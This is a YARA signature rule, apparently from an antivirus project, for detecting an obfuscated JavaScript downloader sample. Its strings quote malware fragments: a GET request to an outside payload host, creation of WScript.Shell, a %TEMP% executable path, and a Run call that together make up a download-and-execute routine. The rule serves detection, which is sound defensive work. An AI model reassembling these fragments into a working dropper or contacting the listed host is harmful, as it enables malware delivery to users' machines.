rule sig_20160330_231a5b3bde62577390d4dd45e2779937 {
  meta:
    description = "datamaliciousorder - file 20160330_231a5b3bde62577390d4dd45e2779937.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "9436621b5c9837a78938ff3dd2d87650dd5d76c190b3a0ec67ccc901a5ce5958"

  strings:
    $s1  = "function _Y(_N0, _OY){_U = _U * 1; return _N0 - _OY;};" fullword ascii
    $s2  = "_K0[_K](\"GET\", \"http://ccluke.cn/b7eus\", false);" fullword ascii
    $s3  = "var _UO = function _H() {return WScript[_YX](\"WScript\"+\".Shell\");}(), _V = 11;" fullword ascii
    $s4  = "if (_K0[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _S() {return _UO[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"4E0D8ABV.ex\" + \"e\";};" fullword ascii
    $s6  = "function _Q0(){return _LI + \"\";};" fullword ascii
    $s7  = "function _N() {return ((_XS == true) && (_XS == _L0)) ? 1 : _U;};" fullword ascii
    $s8  = "function _WD(_Y0){_UO[\"Run\"](_Y0, _U, _U);};" fullword ascii
    $s9  = "function _Q1(){return _YX;};" fullword ascii
    $s10 = "function _VT()" fullword ascii
    $s11 = "function _Q(){return 22;};" fullword ascii
    $s12 = "var _TT = new this[\"Date\"]();" fullword ascii
    $s13 = "return _Y(_YP, _B0);" fullword ascii
    $s14 = " while (_I){" fullword ascii
    $s15 = "function _NN(_B) {var _L = (1, 2, 3, 4, 5, _B); return _L;};" fullword ascii
    $s16 = "var _SK = false;" fullword ascii
    $s17 = "var _XS = false;" fullword ascii
    $s18 = "_XS = true; " fullword ascii
    $s19 = "var _L0 = false;" fullword ascii
    $s20 = "_L0 = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}